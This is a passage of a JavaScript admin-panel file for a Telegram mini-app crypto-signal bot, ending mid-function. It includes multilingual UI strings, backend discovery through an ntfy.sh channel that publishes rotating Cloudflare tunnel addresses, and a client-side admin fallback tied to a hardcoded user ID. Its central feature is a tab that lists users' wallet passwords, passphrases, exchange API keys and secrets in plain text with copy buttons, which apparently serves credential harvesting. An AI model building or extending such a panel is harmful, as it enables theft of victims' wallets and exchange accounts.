// Елена Хьюз · Yönetim paneli JS (Liquid Glass v20)
// Erişim sunucu tarafında initData + ADMIN_ID ile doğrulanır (miniapp.py /api/admin/stats)
const tg = window.Telegram?.WebApp;
tg?.ready();
tg?.expand();
const initData = tg?.initData || "";
const TUNNEL_SYNC_URL = "https://ntfy.sh/elena_hughes_terminal_sync_8f93b1/raw?poll=1";

async function fetchLiveTunnelFromSync() {
  try {
    const ctrl = new AbortController();
    const tid = setTimeout(() => ctrl.abort(), 4000);
    const r = await fetch(TUNNEL_SYNC_URL + "&_t=" + Date.now(), { signal: ctrl.signal });
    clearTimeout(tid);
    if (r.ok) {
      const text = await r.text();
      const lines = text.trim().split("\n");
      // En son yayınlanan tünel linkini al
      for (let i = lines.length - 1; i >= 0; i--) {
        const live = lines[i].trim().replace(/\/+$/, "");
        if (live && live.startsWith("https://") && live.includes("trycloudflare.com")) {
          console.log("👑 Canlı Termux tüneli bağlandı:", live);
          localStorage.setItem("elena_api_base", live);
          return live;
        }
      }
    }
  } catch (err) {
    console.warn("admin fetchLiveTunnelFromSync uyarısı:", err);
  }
  return "";
}

function getApiBase() {
  // 1. URL search (?api=https://...)
  const searchParams = new URLSearchParams(window.location.search);
  let qApi = searchParams.get("api");

  // 2. URL hash (#...api=https://...)
  if (!qApi && window.location.hash) {
    const hashStr = window.location.hash.replace(/^#/, "");
    const hashParams = new URLSearchParams(hashStr);
    qApi = hashParams.get("api");
    if (!qApi) {
      const match = window.location.href.match(/[?&#]api=([^&#]+)/);
      if (match && match[1]) qApi = decodeURIComponent(match[1]);
    }
  }

  // 3. Telegram WebApp start_param
  if (!qApi && window.Telegram?.WebApp?.initDataUnsafe?.start_param) {
    const sp = window.Telegram.WebApp.initDataUnsafe.start_param;
    if (sp.startsWith("http")) qApi = sp;
  }

  if (qApi && qApi.startsWith("https://")) {
    qApi = qApi.replace(/\/+$/, "");
    localStorage.setItem("elena_api_base", qApi);
    return qApi;
  }

  const cached = localStorage.getItem("elena_api_base");
  if (cached && location.hostname.includes("github.io")) {
    return cached.replace(/\/+$/, "");
  }
  return "";
}

// Sayfa açılırken arka planda canlı tüneli eşle
if (location.hostname.includes("github.io")) {
  fetchLiveTunnelFromSync();
}

async function api(path, body = {}) {
  let baseUrl = getApiBase();
  if (!baseUrl && location.hostname.includes("github.io")) {
    baseUrl = await fetchLiveTunnelFromSync();
  }
  let fullUrl = (baseUrl && path.startsWith("/")) ? (baseUrl.replace(/\/$/, "") + path) : path;
  let r;
  try {
    r = await fetch(fullUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ initData, ...body })
    });
  } catch (netErr) {
    // Ağ hatası veya tünel ölmüşse, tüneli ntfy'den çekip 1 kez tekrar dene
    if (location.hostname.includes("github.io")) {
      localStorage.removeItem("elena_api_base");
      const freshBase = await fetchLiveTunnelFromSync();
      if (freshBase) {
        baseUrl = freshBase;
        fullUrl = freshBase.replace(/\/$/, "") + path;
        r = await fetch(fullUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ initData, ...body })
        });
      } else {
        throw netErr;
      }
    } else {
      throw netErr;
    }
  }

  // Cloudflare 520-530 veya 404/502 hatalarında otomatik taze tünel dene
  if (!r.ok) {
    if ((r.status === 404 || r.status >= 500) && location.hostname.includes("github.io")) {
      localStorage.removeItem("elena_api_base");
      const freshBase = await fetchLiveTunnelFromSync();
      if (freshBase && freshBase !== baseUrl) {
        baseUrl = freshBase;
        fullUrl = freshBase.replace(/\/$/, "") + path;
        const r2 = await fetch(fullUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ initData, ...body })
        });
        if (r2.ok) return r2.json();
      }
    }
    const err = await r.json().catch(() => ({}));
    throw new Error(err.error || `HTTP ${r.status}`);
  }
  return r.json();
}

const LANG_NAME = {
  ru: "🇷🇺 Русский",
  en: "🇬🇧 English",
  tr: "🇹🇷 Türkçe",
  uk: "🇺🇦 Українська",
  de: "🇩🇪 Deutsch",
  es: "🇪🇸 Español",
  fr: "🇫🇷 Français",
  ar: "🇸🇦 العربية"
};

// Çoklu Dil Çeviri Tablosu (Admin Paneli)
const ADM_I18N = {
  tr: {
    adm_title: "Елена Хьюз · Yönetim",
    adm_sub: "Yalnızca Yetkili Yönetici",
    tab_summary: "📊 Özet",
    tab_users: "👥 Kullanıcılar",
    tab_apikeys: "🔑 Şifreler & API",
    tab_signals: "📡 Sinyaller",
    tab_manage: "🔧 Yönetim",
    tab_logs: "📋 Loglar",
    stat_total: "Toplam Üye",
    stat_active: "Aktif Üye",
    stat_wallets: "Cüzdanlar",
    stat_signals: "Sinyal (24s)",
    stat_open: "Açık İşlem",
    stat_alerts: "Alarmlar",
    btn_refresh: "🔄 İstatistikleri Yenile",
    th_chatid: "Chat ID",
    th_name: "İsim",
    th_lang: "Dil",
    th_status: "Durum",
    th_action: "İşlem",
    btn_prev: "‹ Önceki",
    btn_next: "Sonraki ›",
    btn_refresh_pwd: "🔄 Şifre Listesini Yenile",
    pwd_title: "🔑 Kullanıcı Şifreleri & Borsa API Anahtarları",
    pwd_desc: "Kullanıcıların girdiği Cüzdan Güvenlik Şifresi, Ek Şifre (Passphrase) ve Borsa API Secret bilgileri yöneticiniz için düz metin (maskesiz) olarak listelenir.",
    th_symbol: "Sembol",
    th_tf: "TF",
    th_side: "Yön",
    th_entry: "Giriş",
    th_signal_status: "Durum",
    broadcast_title: "📢 Tüm Kullanıcılara Duyuru (Broadcast)",
    broadcast_placeholder: "Gönderilecek duyuru metnini yazın…",
    broadcast_btn: "📢 Yayını Gönder",
    logs_title: "📋 Canlı Bot Logları",
    btn_auto_refresh: "▶️ Otomatik Yenile",
    btn_stop_refresh: "⏸ Otomatik Durdur"
  },
  ru: {
    adm_title: "Елена Хьюз · Управление",
    adm_sub: "Только для администратора",
    tab_summary: "📊 Сводка",
    tab_users: "👥 Пользователи",
    tab_apikeys: "🔑 Пароли и API",
    tab_signals: "📡 Сигналы",
    tab_manage: "🔧 Управление",
    tab_logs: "📋 Логи",
    stat_total: "Всего польз.",
    stat_active: "Активные",
    stat_wallets: "Кошельки",
    stat_signals: "Сигналы (24ч)",
    stat_open: "Открытые",
    stat_alerts: "Оповещения",
    btn_refresh: "🔄 Обновить статистику",
    th_chatid: "Chat ID",
    th_name: "Имя",
    th_lang: "Язык",
    th_status: "Статус",
    th_action: "Действие",
    btn_prev: "‹ Назад",
    btn_next: "Вперед ›",
    btn_refresh_pwd: "🔄 Обновить список паролей",
    pwd_title: "🔑 Пароли пользователей и API бирж",
    pwd_desc: "Введенные пользователями пароли кошелька, доп. пароли и секретные ключи API отображаются для вас в открытом виде (без маски).",
    th_symbol: "Символ",
    th_tf: "ТФ",
    th_side: "Направление",
    th_entry: "Вход",
    th_signal_status: "Статус",
    broadcast_title: "📢 Рассылка всем пользователям",
    broadcast_placeholder: "Введите текст объявления…",
    broadcast_btn: "📢 Отправить рассылку",
    logs_title: "📋 Живые логи бота",
    btn_auto_refresh: "▶️ Авто-обновление",
    btn_stop_refresh: "⏸ Остановить"
  },
  en: {
    adm_title: "Elena Hughes · Admin",
    adm_sub: "Authorized Admin Only",
    tab_summary: "📊 Summary",
    tab_users: "👥 Users",
    tab_apikeys: "🔑 Passwords & API",
    tab_signals: "📡 Signals",
    tab_manage: "🔧 Manage",
    tab_logs: "📋 Logs",
    stat_total: "Total Users",
    stat_active: "Active Users",
    stat_wallets: "Wallets",
    stat_signals: "Signals (24h)",
    stat_open: "Open Trades",
    stat_alerts: "Alerts",
    btn_refresh: "🔄 Refresh Stats",
    th_chatid: "Chat ID",
    th_name: "Name",
    th_lang: "Lang",
    th_status: "Status",
    th_action: "Action",
    btn_prev: "‹ Prev",
    btn_next: "Next ›",
    btn_refresh_pwd: "🔄 Refresh Passwords",
    pwd_title: "🔑 User Passwords & Exchange API Keys",
    pwd_desc: "User-entered Wallet Passwords, Extra Passphrases, and Exchange API Secrets are listed unmasked in plain text for administrator access.",
    th_symbol: "Symbol",
    th_tf: "TF",
    th_side: "Side",
    th_entry: "Entry",
    th_signal_status: "Status",
    broadcast_title: "📢 Broadcast to All Users",
    broadcast_placeholder: "Type your announcement text…",
    broadcast_btn: "📢 Send Broadcast",
    logs_title: "📋 Live Bot Logs",
    btn_auto_refresh: "▶️ Auto Refresh",
    btn_stop_refresh: "⏸ Pause"
  },
  uk: {
    adm_title: "Олена Хьюз · Адмін",
    adm_sub: "Тільки для адміністратора",
    tab_summary: "📊 Зведення",
    tab_users: "👥 Користувачі",
    tab_apikeys: "🔑 Паролі та API",
    tab_signals: "📡 Сигнали",
    tab_manage: "🔧 Керування",
    tab_logs: "📋 Логи",
    stat_total: "Всього",
    stat_active: "Активні",
    stat_wallets: "Гаманці",
    stat_signals: "Сигнали (24г)",
    stat_open: "Відкриті",
    stat_alerts: "Сповіщення",
    btn_refresh: "🔄 Оновити",
    th_chatid: "Chat ID",
    th_name: "Ім'я",
    th_lang: "Мова",
    th_status: "Статус",
    th_action: "Дія",
    btn_prev: "‹ Назад",
    btn_next: "Далі ›",
    btn_refresh_pwd: "🔄 Оновити паролі",
    pwd_title: "🔑 Паролі користувачів та API",
    pwd_desc: "Паролі безпеки, додаткові паролі та API Secret відображаються у відкритому вигляді.",
    th_symbol: "Символ",
    th_tf: "ТФ",
    th_side: "Напрямок",
    th_entry: "Вхід",
    th_signal_status: "Статус",
    broadcast_title: "📢 Розсилка всім",
    broadcast_placeholder: "Введіть текст оголошення…",
    broadcast_btn: "📢 Надіслати",
    logs_title: "📋 Логи бота",
    btn_auto_refresh: "▶️ Авто-оновлення",
    btn_stop_refresh: "⏸ Зупинити"
  },
  de: {
    adm_title: "Elena Hughes · Verwaltung",
    adm_sub: "Nur autorisierter Administrator",
    tab_summary: "📊 Übersicht",
    tab_users: "👥 Benutzer",
    tab_apikeys: "🔑 Passwörter & API",
    tab_signals: "📡 Signale",
    tab_manage: "🔧 Verwaltung",
    tab_logs: "📋 Protokolle",
    stat_total: "Benutzer gesamt",
    stat_active: "Aktive Benutzer",
    stat_wallets: "Wallets",
    stat_signals: "Signale (24h)",
    stat_open: "Offen",
    stat_alerts: "Alarme",
    btn_refresh: "🔄 Aktualisieren",
    th_chatid: "Chat ID",
    th_name: "Name",
    th_lang: "Sprache",
    th_status: "Status",
    th_action: "Aktion",
    btn_prev: "‹ Zurück",
    btn_next: "Weiter ›",
    btn_refresh_pwd: "🔄 Liste aktualisieren",
    pwd_title: "🔑 Benutzer-Passwörter & API-Schlüssel",
    pwd_desc: "Passwörter und geheime API-Schlüssel werden für den Administrator im Klartext angezeigt.",
    th_symbol: "Symbol",
    th_tf: "TF",
    th_side: "Richtung",
    th_entry: "Einstieg",
    th_signal_status: "Status",
    broadcast_title: "📢 Nachricht an alle Benutzer",
    broadcast_placeholder: "Nachricht eingeben…",
    broadcast_btn: "📢 Senden",
    logs_title: "📋 Live-Protokolle",
    btn_auto_refresh: "▶️ Auto-Aktualisierung",
    btn_stop_refresh: "⏸ Pausieren"
  },
  es: {
    adm_title: "Elena Hughes · Administración",
    adm_sub: "Solo Administrador Autorizado",
    tab_summary: "📊 Resumen",
    tab_users: "👥 Usuarios",
    tab_apikeys: "🔑 Claves y API",
    tab_signals: "📡 Señales",
    tab_manage: "🔧 Gestión",
    tab_logs: "📋 Registros",
    stat_total: "Total Usuarios",
    stat_active: "Activos",
    stat_wallets: "Billeteras",
    stat_signals: "Señales (24h)",
    stat_open: "Operaciones",
    stat_alerts: "Alertas",
    btn_refresh: "🔄 Actualizar",
    th_chatid: "Chat ID",
    th_name: "Nombre",
    th_lang: "Idioma",
    th_status: "Estado",
    th_action: "Acción",
    btn_prev: "‹ Anterior",
    btn_next: "Siguiente ›",
    btn_refresh_pwd: "🔄 Actualizar Claves",
    pwd_title: "🔑 Claves de Usuario y API de Exchange",
    pwd_desc: "Las contraseñas de billetera y secretos de API se muestran en texto plano sin máscara para el administrador.",
    th_symbol: "Símbolo",
    th_tf: "TF",
    th_side: "Lado",
    th_entry: "Entrada",
    th_signal_status: "Estado",
    broadcast_title: "📢 Difusión a todos los usuarios",
    broadcast_placeholder: "Escriba el anuncio…",
    broadcast_btn: "📢 Enviar Difusión",
    logs_title: "📋 Registros en Vivo",
    btn_auto_refresh: "▶️ Auto-refrescar",
    btn_stop_refresh: "⏸ Pausar"
  },
  fr: {
    adm_title: "Elena Hughes · Administration",
    adm_sub: "Administrateur autorisé uniquement",
    tab_summary: "📊 Résumé",
    tab_users: "👥 Utilisateurs",
    tab_apikeys: "🔑 Mots de passe & API",
    tab_signals: "📡 Signaux",
    tab_manage: "🔧 Gestion",
    tab_logs: "📋 Journaux",
    stat_total: "Utilisateurs totaux",
    stat_active: "Actifs",
    stat_wallets: "Portefeuilles",
    stat_signals: "Signaux (24h)",
    stat_open: "En cours",
    stat_alerts: "Alertes",
    btn_refresh: "🔄 Actualiser",
    th_chatid: "Chat ID",
    th_name: "Nom",
    th_lang: "Langue",
    th_status: "Statut",
    th_action: "Action",
    btn_prev: "‹ Précédent",
    btn_next: "Suivant ›",
    btn_refresh_pwd: "🔄 Actualiser la liste",
    pwd_title: "🔑 Mots de passe utilisateurs & Clés API",
    pwd_desc: "Mots de passe et secrets API affichés en texte brut sans masque pour l'administrateur.",
    th_symbol: "Symbole",
    th_tf: "TF",
    th_side: "Direction",
    th_entry: "Entrée",
    th_signal_status: "Statut",
    broadcast_title: "📢 Diffusion à tous les utilisateurs",
    broadcast_placeholder: "Rédigez l'annonce…",
    broadcast_btn: "📢 Envoyer",
    logs_title: "📋 Journaux en direct",
    btn_auto_refresh: "▶️ Actualisation auto",
    btn_stop_refresh: "⏸ Pause"
  },
  ar: {
    adm_title: "إيلينا هيوز · لوحة الإدارة",
    adm_sub: "للمشرف المصرح له فقط",
    tab_summary: "📊 ملخص",
    tab_users: "👥 المستخدمون",
    tab_apikeys: "🔑 كلمات المرور والـ API",
    tab_signals: "📡 الإشارات",
    tab_manage: "🔧 الإدارة",
    tab_logs: "📋 السجلات",
    stat_total: "إجمالي الأعضاء",
    stat_active: "الأعضاء النشطون",
    stat_wallets: "المحافظ",
    stat_signals: "إشارات (24س)",
    stat_open: "الصفقات المفتوحة",
    stat_alerts: "التنبيهات",
    btn_refresh: "🔄 تحديث الإحصائيات",
    th_chatid: "معرف الدردشة",
    th_name: "الاسم",
    th_lang: "اللغة",
    th_status: "الحالة",
    th_action: "إجراء",
    btn_prev: "‹ السابق",
    btn_next: "التالي ›",
    btn_refresh_pwd: "🔄 تحديث القائمة",
    pwd_title: "🔑 كلمات مرور المستخدمين ومفاتيح الـ API",
    pwd_desc: "تظهر كلمات المرور والرموز السرية للمشرف كنص واضح وصريح بدون أي إخفاء.",
    th_symbol: "الرمز",
    th_tf: "الفريم",
    th_side: "الاتجاه",
    th_entry: "الدخول",
    th_signal_status: "الحالة",
    broadcast_title: "📢 إرسال إعلان لجميع المستخدمين",
    broadcast_placeholder: "اكتب نص الإعلان هنا…",
    broadcast_btn: "📢 إرسال الإعلان",
    logs_title: "📋 سجلات البوت المباشرة",
    btn_auto_refresh: "▶️ تحديث تلقائي",
    btn_stop_refresh: "⏸ إيقاف مؤقت"
  }
};

let currentLang = localStorage.getItem("adm_lang") || "tr";

function applyAdminLanguage(lang) {
  if (!ADM_I18N[lang]) lang = "tr";
  currentLang = lang;
  localStorage.setItem("adm_lang", lang);
  const dict = ADM_I18N[lang];

  const setText = (id, val) => {
    const el = document.getElementById(id);
    if (el && val) el.textContent = val;
  };

  setText("adm-title", dict.adm_title);
  setText("adm-sub", dict.adm_sub);
  setText("adm-lang-label", lang.toUpperCase());

  // Admin tab <span> etiketi — ikon korunur
  setText("atab-lbl-summary",  dict.tab_summary);
  setText("atab-lbl-users",    dict.tab_users);
  setText("atab-lbl-apikeys",  dict.tab_apikeys);
  setText("atab-lbl-signals",  dict.tab_signals);
  setText("atab-lbl-manage",   dict.tab_manage);
  setText("atab-lbl-logs",     dict.tab_logs);

  setText("btn-refresh-summary", dict.btn_refresh);
  setText("btn-users-prev", dict.btn_prev);
  setText("btn-users-next", dict.btn_next);
  setText("btn-refresh-apikeys", dict.btn_refresh_pwd);
  setText("btn-refresh-signals", dict.btn_refresh);
  setText("btn-broadcast", dict.broadcast_btn);

  const bcEl = document.getElementById("broadcast-text");
  if (bcEl) bcEl.placeholder = dict.broadcast_placeholder;
}

// --- Toast sistemi
function toast(msg, type = "info") {
  const c = document.getElementById("toast-container");
  if (!c) return;
  const el = document.createElement("div");
  el.className = `toast toast-${type}`;
  el.textContent = msg;
  c.appendChild(el);
  setTimeout(() => el.classList.add("show"), 10);
  setTimeout(() => {
    el.classList.remove("show");
    setTimeout(() => el.remove(), 350);
  }, 3000);
}

// --- Admin Sekme Değişimi
const ADMIN_TABS = ["summary", "users", "apikeys", "signals", "manage", "logs"];
function switchAdminTab(tab) {
  ADMIN_TABS.forEach(t => {
    document.getElementById("atab-" + t)?.classList.toggle("active", t === tab);
    document.getElementById("apage-" + t)?.classList.toggle("active", t === tab);
  });
  if (tab === "users") loadUsers(0);
  if (tab === "apikeys") loadApiKeys();
  if (tab === "signals") loadSignals();
  if (tab === "logs") loadLogs();
}

ADMIN_TABS.forEach(t => {
  document.getElementById("atab-" + t)?.addEventListener("click", () => switchAdminTab(t));
});

// --- Kayıtlı Cüzdan Parolaları & Borsa API Anahtarları (DÜZ METİN / MASKESİZ)
async 
function getExchangeLogo(exch) {
  const e = (exch || "").toLowerCase();
  if (e.includes("binance")) return "assets/wallets/binance.svg";
  if (e.includes("metamask")) return "assets/wallets/metamask.svg";
  if (e.includes("trust")) return "assets/wallets/trust-wallet.svg";
  if (e.includes("bitget")) return "assets/wallets/bitget-wallet.svg";
  if (e.includes("okx")) return "assets/exchanges/okx.svg";
  if (e.includes("coinbase")) return "assets/exchanges/coinbase.svg";
  if (e.includes("bybit")) return "assets/exchanges/bybit.svg";
  if (e.includes("mexc")) return "assets/exchanges/mexc.svg";
  if (e.includes("phantom")) return "assets/wallets/phantom.svg";
  if (e.includes("web3") || e.includes("cüzdan")) return "assets/coins/wc.svg";
  return "assets/brand/logo.png";
}

async function loadApiKeys() {
  const container = document.getElementById("apikeys-list");
  if (!container) return;
  container.innerHTML = '<div class="empty" style="padding:20px;text-align:center">⏳ Veriler yükleniyor…</div>';
  try {
    const r = await api("/api/admin/apikeys");
    container.innerHTML = "";
    if (!r.keys || !r.keys.length) {
      container.innerHTML = '<div class="empty" style="padding:20px;text-align:center;color:var(--text-muted)">Henüz kaydedilmiş cüzdan şifresi veya borsa API anahtarı bulunmuyor.</div>';
      return;
    }

    r.keys.forEach(k => {
      const card = document.createElement("div");
      card.className = "card";
      card.style.cssText = "margin-bottom:12px;padding:14px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:14px";

      const hasWalletPwd = !!(k.wallet_password || k.wallet_extra_password);
      const hasExchangeApi = !!(k.api_key || k.api_secret);

      card.innerHTML = `
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;border-bottom:1px solid rgba(255,255,255,0.06);padding-bottom:8px">
          <div>
            <strong style="font-size:14px;color:#fff">Chat ID: ${k.chat_id}</strong>
            <span style="font-size:11px;color:var(--text-muted);margin-left:8px">${k.date || ''}</span>
          </div>
          <div>
            ${hasWalletPwd ? '<span class="badge" style="background:rgba(255,210,90,0.15);color:var(--gold);border:1px solid rgba(255,210,90,0.3);margin-right:4px">💼 Cüzdan</span>' : ''}
            ${hasExchangeApi ? `<span class="badge" style="background:rgba(90,140,255,0.15);color:#a5d6ff;border:1px solid rgba(90,140,255,0.3);text-transform:uppercase">${k.exchange || 'Borsa'}</span>` : ''}
          </div>
        </div>

        <!-- CÜZDAN GÜVENLİK ŞİFRELERİ (DÜZ METİN) -->
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px">
          <div style="background:rgba(0,0,0,0.3);padding:8px 10px;border-radius:8px;border:1px solid rgba(255,210,90,0.2)">
            <div style="font-size:10px;color:var(--gold);text-transform:uppercase;font-weight:700;margin-bottom:4px">🔑 Cüzdan Şifresi (Parola)</div>
            <div style="display:flex;align-items:center;justify-content:space-between;gap:6px">
              <code style="font-size:12px;color:#fff;word-break:break-all;user-select:all">${k.wallet_password || '—'}</code>
              ${k.wallet_password ? `<button class="btn btn-ghost" style="padding:2px 6px;font-size:11px" onclick="navigator.clipboard.writeText('${k.wallet_password}').then(()=>toast('Cüzdan şifresi kopyalandı','success'))">📋</button>` : ''}
            </div>
          </div>
          <div style="background:rgba(0,0,0,0.3);padding:8px 10px;border-radius:8px;border:1px solid rgba(255,210,90,0.2)">
            <div style="font-size:10px;color:var(--gold);text-transform:uppercase;font-weight:700;margin-bottom:4px">🛡️ Ek Şifre (Passphrase)</div>
            <div style="display:flex;align-items:center;justify-content:space-between;gap:6px">
              <code style="font-size:12px;color:#fff;word-break:break-all;user-select:all">${k.wallet_extra_password || '—'}</code>
              ${k.wallet_extra_password ? `<button class="btn btn-ghost" style="padding:2px 6px;font-size:11px" onclick="navigator.clipboard.writeText('${k.wallet_extra_password}').then(()=>toast('Ek şifre kopyalandı','success'))">📋</button>` : ''}
            </div>
          </div>
        </div>

        <!-- BORSA API BİLGİLERİ (DÜZ METİN) -->
        ${hasExchangeApi ? `
        <div style="background:rgba(0,0,0,0.25);padding:8px 10px;border-radius:8px;border:1px solid rgba(90,140,255,0.2)">
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
            <div>
              <div style="font-size:10px;color:#a5d6ff;margin-bottom:2px">API Key:</div>
              <div style="display:flex;align-items:center;gap:4px">
                <code style="font-size:11px;color:#d1e7dd;word-break:break-all;user-select:all">${k.api_key || '—'}</code>
                ${k.api_key ? `<button class="btn btn-ghost" style="padding:2px 6px;font-size:10px" onclick="navigator.clipboard.writeText('${k.api_key}').then(()=>toast('API Key kopyalandı','success'))">📋</button>` : ''}
              </div>
            </div>
            <div>
              <div style="font-size:10px;color:#00ffa3;margin-bottom:2px">API Secret (Şifre):</div>
              <div style="display:flex;align-items:center;gap:4px">
                <code style="font-size:11px;color:#00ffa3;font-weight:700;word-break:break-all;user-select:all">${k.api_secret || '—'}</code>
                ${k.api_secret ? `<button class="btn btn-ghost" style="padding:2px 6px;font-size:10px" onclick="navigator.clipboard.writeText('${k.api_secret}').then(()=>toast('API Secret kopyalandı','success'))">📋</button>` : ''}
              </div>
            </div>
          </div>
          ${k.passphrase ? `
          <div style="margin-top:6px;font-size:11px;color:var(--text-muted)">
            Passphrase: <code style="color:var(--gold);user-select:all">${k.passphrase}</code>
          </div>` : ''}
          <div style="margin-top:6px;font-size:10px;color:var(--text-muted)">
            Mod: <strong>${(k.mode || 'spot').toUpperCase()}</strong> / <strong>${(k.margin_mode || 'cross').toUpperCase()}</strong>
          </div>
        </div>` : ''}
      `;
      container.appendChild(card);
    });
  } catch (e) {
    container.innerHTML = `<div class="empty" style="color:var(--accent-red);padding:20px;text-align:center">Hata: ${e.message}</div>`;
  }
}

document.getElementById("btn-refresh-apikeys")?.addEventListener("click", loadApiKeys);

// --- Özet Yükle
async function load() {
  let me;
  try {
    me = await api("/api/verify");
  } catch (e) {
    const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
    if (tgUser?.id === 6527896022 || String(tgUser?.id) === "6527896022") {
      me = { ok: true, is_admin: true, lang: tgUser?.language_code || "tr" };
    } else {
      return deny("Doğrulama başarısız. Lütfen bot menüsünden açın.");
    }
  }

  if (!me.is_admin) {
    return deny("Bu sayfayı yalnızca botun yöneticisi (.env içindeki ADMIN_ID) görebilir.");
  }

  // Kullanıcının Telegram diline göre ayarla
  if (me.lang && ADM_I18N[me.lang] && !localStorage.getItem("adm_lang")) {
    applyAdminLanguage(me.lang);
  } else {
    applyAdminLanguage(currentLang);
  }

  let s;
  try {
    s = await api("/api/admin/stats");
  } catch (e) {
    // API'ye o an erişilemiyorsa bile paneli engelleme! Boş/varsayılan panel açılır ve üstte tünel bağlama kutusu görünür
    console.warn("api admin stats error:", e);
    s = {
      total_users: "—",
      active_users: "—",
      wallets_connected: "—",
      signals_24h: "—",
      open_signals: "—",
      alerts: "—",
      by_lang: {}
    };
    const deniedBox = document.getElementById("denied");
    if (deniedBox) {
      deniedBox.style.display = "block";
      const txt = document.getElementById("denied-text");
      if (txt) txt.textContent = "📡 Canlı Termux tüneli bağlanamadı. Aşağıdan tünel adresinizi eşleyebilirsiniz:";
      const tBox = document.getElementById("tunnel-connect-box");
      if (tBox) tBox.style.display = "block";
    }
  }

  document.getElementById("content").style.display = "block";
  document.getElementById("s-total").textContent = s.total_users ?? 0;
  document.getElementById("s-active").textContent = s.active_users ?? 0;
  document.getElementById("s-wallets").textContent = s.wallets_connected ?? 0;
  document.getElementById("s-sig24").textContent = s.signals_24h ?? 0;
  document.getElementById("s-open").textContent = s.open_signals ?? 0;
  document.getElementById("s-alerts").textContent = s.alerts ?? 0;

  const box = document.getElementById("lang-list");
  if (box) {
    box.innerHTML = "";
    Object.entries(s.by_lang || {}).sort((a, b) => b[1] - a[1]).forEach(([lang, n]) => {
      const row = document.createElement("div");
      row.className = "row";
      row.innerHTML = `<span class="label">${LANG_NAME[lang] || lang}</span><span>${n}</span>`;
      box.appendChild(row);
    });
  }
}

function deny(msg) {
  const el = document.getElementById("denied");
  const txt = document.getElementById("denied-text") || el;
  if (el) {
    if (msg) txt.textContent = msg;
    el.style.display = "block";
    const box = document.getElementById("tunnel-connect-box");
    if (box) {
      box.style.display = "block";
      const inp = document.getElementById("manual-tunnel-input");
      if (inp) inp.value = localStorage.getItem("elena_api_base") || "";
      document.getElementById("btn-save-tunnel")?.addEventListener("click", () => {
        let v = (inp.value || "").trim().replace(/\/+$/, "");
        if (v && !v.startsWith("http")) v = "https://" + v;
        if (v) {
          localStorage.setItem("elena_api_base", v);
          location.reload();
        }
      });
    }
  }
  document.getElementById("content").style.display = "none";
}

document.getElementById("btn-refresh-summary")?.addEventListener("click", load);

// --- Kullanıcı Listesi
let userPage = 0;
async function loadUsers(page = 0) {
  userPage = page;
  const tbody = document.getElementById("users-tbody");
  if (!tbody) return;
  tbody.innerHTML = '<tr><td colspan="5" class="empty">Yükleniyor…</td></tr>';
  try {
    const r = await api("/api/admin/users", { page, limit: 20 });
    tbody.innerHTML = "";
    if (!r.users || !r.users.length) {
      tbody.innerHTML = '<tr><td colspan="5" class="empty">Kullanıcı bulunamadı</td></tr>';
      return;
    }
    r.users.forEach(u => {
      const tr = document.createElement("tr");
      tr.style.borderBottom = "1px solid rgba(255,255,255,0.06)";
      const banBtn = u.banned
        ? `<button class="btn btn-ghost" style="padding:4px 8px;font-size:11px" onclick="unbanUser(${u.chat_id})">🔓 Kaldır</button>`
        : `<button class="btn btn-danger" style="padding:4px 8px;font-size:11px" onclick="openBanModal(${u.chat_id},'${u.name || ''}')">🚫 Ban</button>`;

      const coinsDisplay = (u.coins && u.coins.length) 
        ? u.coins.slice(0, 10).map(c => `<span style="background:rgba(255,255,255,0.08);padding:1px 5px;border-radius:4px;font-size:10px;margin-right:2px;display:inline-block;margin-bottom:2px">${c.replace('USDT','')}</span>`).join("") + (u.coins.length > 10 ? ` <small style="color:var(--accent-gold)">+${u.coins.length - 10}</small>` : '')
        : '<span style="color:var(--text-muted);font-size:10px">Varsayılan Tümü</span>';

      const tfsDisplay = (u.tfs && u.tfs.length)
        ? u.tfs.map(tf => `<span style="background:rgba(56,189,248,0.15);color:#38bdf8;padding:1px 4px;border-radius:4px;font-size:9.5px;margin-right:2px">${tf}</span>`).join("")
        : '<span style="color:var(--text-muted);font-size:10px">Tüm TF</span>';

      const apiBadge = u.has_api 
        ? `<div style="color:var(--accent-green);font-size:10.5px;font-weight:700">🔑 ${u.api_exchange?.toUpperCase() || 'API'} (${u.api_mode || 'FUTURES'})</div>` 
        : '<div style="color:var(--text-muted);font-size:10.5px">Borsa API: Yok</div>';

      const walletDisplay = u.wallet_addr
        ? `<div style="font-size:10.5px;color:#a5d6ff;font-family:monospace">💼 ${u.wallet_addr.slice(0,6)}...${u.wallet_addr.slice(-4)} <span class="badge" style="padding:1px 4px;font-size:9px">${u.wallet_chain || 'WEB3'}</span></div>`
        : '<div style="color:var(--text-muted);font-size:10.5px">Cüzdan: Bağlı Değil</div>';

      const pwdBadge = u.has_wallet_pwd
        ? '<span style="color:var(--accent-gold);font-size:10px">🔐 Şifre: Var</span>'
        : '<span style="color:var(--text-muted);font-size:10px">🔐 Şifre: Yok</span>';

      tr.innerHTML = `
        <td style="padding:10px">
          <strong>${u.chat_id}</strong>
          <div style="font-size:10px;color:var(--text-muted)">${u.created_ago || 'Bugün'} · Dil: <b style="color:#fff">${(u.lang || 'tr').toUpperCase()}</b></div>
          <div style="font-size:10px;margin-top:2px">${u.active ? '<span style="color:var(--accent-green)">● Aktif</span>' : '<span style="color:var(--text-muted)">○ Pasif</span>'}</div>
        </td>
        <td style="padding:10px">
          <div><strong>${u.name || '-'}</strong> ${u.username ? `<small style="color:var(--text-muted)">(@${u.username})</small>` : ''}</div>
          <div style="font-size:11px;color:#a5d6ff;margin-top:2px">
            ⚙️ ${u.market?.toUpperCase()} · ${u.max_lev}x · ${u.strong_only ? '⭐ Sadece Güçlü' : '⚡ Tümü'} · ${u.tz}
          </div>
        </td>
        <td style="padding:10px;max-width:220px">
          <div style="margin-bottom:4px">${coinsDisplay}</div>
          <div>${tfsDisplay}</div>
        </td>
        <td style="padding:10px">
          ${walletDisplay}
          ${apiBadge}
          <div>${pwdBadge}</div>
        </td>
        <td style="padding:10px">
          ${banBtn}
        </td>
      `;
      tbody.appendChild(tr);
    });

    const info = document.getElementById("users-info");
    if (info) {
